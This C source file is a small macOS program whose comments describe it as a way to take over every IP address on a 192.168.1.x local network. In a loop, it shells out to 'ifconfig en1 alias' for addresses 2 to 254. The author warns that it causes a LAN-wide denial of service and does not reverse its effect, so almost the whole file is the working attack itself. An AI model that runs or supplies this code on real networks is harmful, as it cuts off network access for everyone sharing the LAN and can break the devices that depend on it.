//A quick test by Rezand email at iPhoneHungry@yahoo.com do not email me to complain about any 
//problems you created. If you don't know what your doing or permission to break things don't use this.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


// Warning: use this code at your own risk, this can create a lan wide Denial of service
//which depending on what's on your network or router could create further issues.

//this code does not reverse the effect though you simply need to change the alias command below in sysString

//A OSX loop to take over ip's on the lan across the span of 192.168.1.2-255

int main()
{	
char xChar[4];

	for (int x = 2; x < 255; x++ )
	{
	
	    //     sprintf pushing the x int into a char
	    sprintf(xChar ,"%d", x );
		
		//     en1 is the name of my wifi, use ifconfig in terminal on OSX to figure out yours
		char sysString [] = ("ifconfig en1 alias 192.168.1.%s \n");
        
        //     oversized char array below to hold final string
		char finalStr[100];
		
		//sprintf pushing x char onto sysString and then total into finalStr
		sprintf(finalStr,sysString,xChar);
		
		//    throwing sysString as a command this is not shown during program run so I 
		//    also used printf below
	    system (finalStr);

	    
	    printf("%s \n",sysString);
	}
		
return 0;	
}	